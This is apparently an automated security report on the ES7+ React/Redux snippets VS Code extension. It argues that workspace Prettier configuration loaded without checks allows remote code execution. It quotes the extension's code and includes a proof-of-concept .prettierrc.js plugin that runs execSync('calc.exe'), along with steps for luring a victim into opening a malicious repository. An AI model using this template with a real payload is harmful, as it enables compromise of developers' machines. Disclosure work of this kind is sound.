# Vulnerabilities

After analyzing the codebase of the ES7+ React/Redux/React-Native/JS snippets VS Code extension, focusing on vulnerabilities that could lead to remote code execution (RCE), command injection, or code injection, I've identified one high-severity vulnerability:

## Remote Code Execution via Malicious Prettier Configuration

### Vulnerability name
Remote Code Execution via Malicious Prettier Configuration

### Description
The extension allows the use of Prettier configuration from the workspace to format snippets. When a user has this extension installed and opens a malicious repository, the extension will load Prettier configuration from that repository via the `prettier.resolveConfig()` method with `editorconfig: true` enabled. This configuration is then used without proper validation when formatting snippets.

In `getPrettierConfig.ts`:
```typescript
let prettierConfig: prettier.Options | null;
prettier
  .resolveConfig('', { editorconfig: true })
  .then((config) => (prettierConfig = config));

const getPrettierConfig = (): Options => {
  const { prettierEnabled } = extensionConfig();
  return {
    parser: 'typescript',
    ...(prettierEnabled && prettierConfig),
  };
};
```

The extension blindly merges and uses whatever configuration is loaded from the repository, which can include malicious plugins or options.

### Impact
An attacker can create a malicious repository with specially crafted Prettier configuration that loads arbitrary code through custom plugins. When a victim opens this repository in VS Code with this extension installed, the malicious Prettier configuration will be loaded and executed when snippets are generated or formatted, leading to arbitrary code execution in the context of the VS Code process.

### Vulnerability rank
Critical

### Currently implemented mitigations
None. The extension does not validate or sanitize the Prettier configuration loaded from the workspace.

### Missing mitigations
1. Disable the use of custom Prettier plugins from workspace configurations
2. Whitelist allowed Prettier configuration options
3. Sandbox the formatting process
4. At minimum, display a security warning when loading Prettier configuration from untrusted workspaces

### Preconditions
1. Victim must have the VS Code extension installed
2. Victim must open a repository containing malicious Prettier configuration
3. Extension's prettierEnabled setting must be true (which is the default)

### Source code analysis
The vulnerability exists in the following execution flow:

1. In `getPrettierConfig.ts`, the extension initializes by resolving Prettier configuration:
   ```typescript
   prettier.resolveConfig('', { editorconfig: true })
     .then((config) => (prettierConfig = config));
   ```
   This loads configuration from any `.prettierrc`, `.prettierrc.js`, or `prettier` field in `package.json` in the current workspace.

2. When the extension needs to format snippets in `formatters.ts`, it uses this configuration:
   ```typescript
   export const formatSnippet = (snippetString: string) => {
     return extensionConfig().prettierEnabled
       ? prettier.format(snippetString, getPrettierConfig())
       : snippetString;
   };
   ```

3. The configuration can specify custom plugins that get loaded and executed:
   ```typescript
   // In getPrettierConfig.ts
   return {
     parser: 'typescript',
     ...(prettierEnabled && prettierConfig),
   };
   ```
   
4. This happens when:
   - The extension activates and generates snippets (`await generateSnippets()` in `index.ts`)
   - Configuration changes trigger regeneration of snippets
   - User searches for a snippet via the command palette

### Security test case
1. Create a malicious repository with the following `.prettierrc.js` file:
   ```javascript
   module.exports = {
     plugins: [
       {
         parsers: {
           typescript: {
             parse: (text, parsers, options) => {
               // Malicious code execution
               const process = require('child_process');
               process.execSync('calc.exe'); // Launch calculator on Windows as proof
               
               // Return valid AST to avoid errors
               return require('prettier/parser-typescript').parsers.typescript.parse(text, options);
             }
           }
         }
       }
     ]
   };
   ```

2. Commit and push this repository to a public host (e.g., GitHub)

3. Send a link to the victim, asking them to review your code in VS Code

4. When the victim opens the repository with the ES7 React Snippets extension installed, the malicious code in the Prettier plugin will execute automatically

5. The calculator application will launch on the victim's computer, demonstrating arbitrary code execution

This vulnerability poses a serious risk as it allows attackers to execute arbitrary code on a victim's machine simply by having them open a malicious repository.